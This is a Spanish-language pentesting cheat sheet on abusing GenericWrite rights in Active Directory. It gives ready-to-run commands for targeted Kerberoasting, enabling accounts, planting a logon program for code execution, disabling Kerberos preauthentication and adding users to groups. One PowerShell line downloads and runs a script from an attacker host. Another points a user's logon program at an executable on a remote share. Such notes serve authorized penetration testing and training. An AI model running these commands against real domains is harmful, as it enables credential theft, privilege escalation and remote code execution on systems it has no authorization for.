## GenericWrite (Usuario sobre Usuario)

Si un usuario tiene `GenericWrite` sobre otro usuario, puede obtener su hash NT, obtener un hash Kerberoastable y modificar propiedades del usuario — incluyendo el script de inicio de sesión, lo que permite RCE si el usuario se conecta.

---

### Shadow Credentials (obtener hash NT)

Consultar la sección de Shadow Credentials:
https://github.com/ArtesOscuras/Notes/blob/main/abusing_DACLs/AddKeyCredentialLink%20(SHADOW%20CREDENTIALS).md

---

### Targeted Kerberoast (obtener hash Kerberoastable)

Podemos hacer que el usuario objetivo sea Kerberoastable. El usuario debe estar habilitado — si no lo está, habilitarlo primero. Puede ser necesario sincronizar la hora con el DC para interactuar con Kerberos.

#### Desde Linux (externamente — recomendado)

```shell
# Con contraseña
targetedKerberoast.py -v -d '<dominio>' -u '<usuario controlado>' -p '<contraseña>'

# Con hash NT
targetedKerberoast.py -v -d '<dominio>' -u '<usuario controlado>' -H :<hash_nt>
```

Con autenticación Kerberos:

```shell
getTGT.py <dominio>/<usuario>:<contraseña> -dc-ip <ip_dc>
export KRB5CCNAME=<archivo.ccache>
targetedKerberoast.py -v -d '<dominio>' -u '<usuario>' -k --no-pass --dc-host <maquina.dominio>
```

> 💡 Si aparece el error `KRB_AP_ERR_SKEW`, sincronizar el reloj con el DC antes de continuar.

#### Desde Windows (internamente)

```powershell
# Cargar PowerView
IEX (new-object net.webclient).downloadstring('http://<ip_atacante>/powerview.ps1')

# Verificar que el usuario objetivo no tiene SPN
Get-DomainUser '<usuario_victima>' | Select serviceprincipalname

# Asignar un SPN falso
Set-DomainObject -Identity 'usuario_victima' -Set @{serviceprincipalname='nonexistent/BLAHBLAH'}

# Obtener el hash Kerberoastable
$User = Get-DomainUser '<usuario_victima>'
$User | Get-DomainSPNTicket | fl
```

---

### Habilitar usuario o modificar propiedades

#### Desde Linux (externamente)

La forma más cómoda es usar `ldap_shell` de forma interactiva:

```shell
ldap_shell.py '<dominio>/<usuario controlado>:<contraseña>' -dc-ip <ip>
```

Dentro de la shell interactiva, por ejemplo: `enable_account <usuario>`

Fuente: https://github.com/PShlyundin/ldap_shell

#### Desde Windows (internamente)

Usar `Set-DomainObject` de PowerSploit o PowerView directamente desde la máquina comprometida.

---

### Establecer script de inicio de sesión (RCE si el usuario se conecta)

Si el usuario objetivo inicia sesión, ejecutará automáticamente el programa especificado.

#### Desde Linux (externamente)

```shell
bloodyAD --host '<ip_dc>' -d '<dominio>' -u '<usuario controlado>' -p '<contraseña>' \
  set object <usuario_objetivo> msTSInitialProgram -v '\\1.2.3.4\share\archivo.exe'
```

#### Desde Windows (internamente)

Usar PowerView o `Set-DomainObject` con el atributo `msTSInitialProgram`.

---

### Hacer al usuario ASREPRoastable

#### Desde Windows (internamente)

Desactivar la preautenticación Kerberos del usuario objetivo:

```powershell
Get-ADUser usuario_objetivo | Set-ADAccountControl -doesnotrequirepreauth $true
```

---

## GenericWrite (Usuario sobre Grupo)

Si un usuario tiene `GenericWrite` sobre un grupo, puede añadir usuarios a ese grupo y modificar algunas propiedades del mismo.

### Añadir un usuario al grupo

#### Desde Linux (externamente)

```shell
# Con herramientas Samba
net rpc group addmem '<grupo_objetivo>' '<usuario_objetivo>' \
  -U '<dominio>'/'<usuario_controlado>'%'<contraseña>' -S <ip_dc>

# Con BloodyAD
bloodyAD --host '<ip>' -d '<dominio>' -u '<usuario_controlado>' -p '<contraseña>' \
  add groupMember '<grupo_objetivo>' '<usuario_objetivo>'
```

#### Desde Windows (internamente)

```powershell
net group '<grupo_objetivo>' <usuario_objetivo> /add /domain
```

> 💡 Si el comando falla, intentarlo con PowerView — a veces las restricciones de directiva de grupo bloquean `net group` pero no los métodos de PowerView.
